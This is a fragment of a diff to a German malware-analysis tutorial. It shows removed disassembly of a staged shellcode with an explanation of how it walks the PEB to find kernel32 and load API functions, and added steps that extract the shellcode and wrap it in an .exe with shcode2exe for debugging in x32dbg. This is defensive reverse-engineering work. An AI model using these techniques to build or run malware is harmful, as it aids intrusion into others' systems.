-000000E9  0355F4            add dx,[di-0xc]
-000000EC  817AFC656F        cmp word [bp+si-0x4],0x6f65
-000000F1  660A7502          o32 or dh,[di+0x2]
-000000F5  EB20              jmp short 0x117
-000000F7  680080            push word 0x8000
-000000FA  0000              add [bx+si],al
-000000FC  8B                db 0x8b
+```bash
+python extract_shellcode.py
 ```
 
-Die Instruktion MOV EAX, FS:[0x30], die wir bei Adresse 0x00000017 gefunden haben, zeigt, dass der Shellcode versucht, auf den Process Environment Block, also den PEB, zuzugreifen.
+=> haben wir die Datei `shellcode.bin` erhalten.
 
-Das ist bei vielen Shellcodes ganz typisch – sie holen sich damit Infos über den Prozess, zum Beispiel wo genau die wichtigen DLLs wie kernel32.dll im Speicher liegen.
 
-Danach werden Funktionen wie LoadLibrary oder GetProcAddress verwendet, um weitere Funktionen zu laden. So kann der Shellcode seine eigentliche Payload nach und nach ausführen – also genau das, was man bei einem staged Shellcode erwartet.
+## 8. Umwandlung des Shellcodes in eine ausführbare Datei
+
+Um eine dynamische Analyse mit `x32dbg` durchzuführen, müssen wir den Shellcode in eine `.exe`-Datei umwandeln. Dafür verwenden wir das Tool `shcode2exe`, das wir von GitHub herunterladen:
+
+🔗 https://github.com/accidentalrebel/shcode2exe/blob/master/shcode2exe.py
+
+Nachdem wir das Skript heruntergeladen haben, führen wir den folgenden Befehl aus:
+
+```bash
+python shcode2exe.py -o sc_full.exe shellcode.bin
+```
+
+=> Dies erzeugt eine Datei namens `sc_full.exe`, die wir nun mit Debugging-Tools wie `x32dbg` weiter untersuchen können.
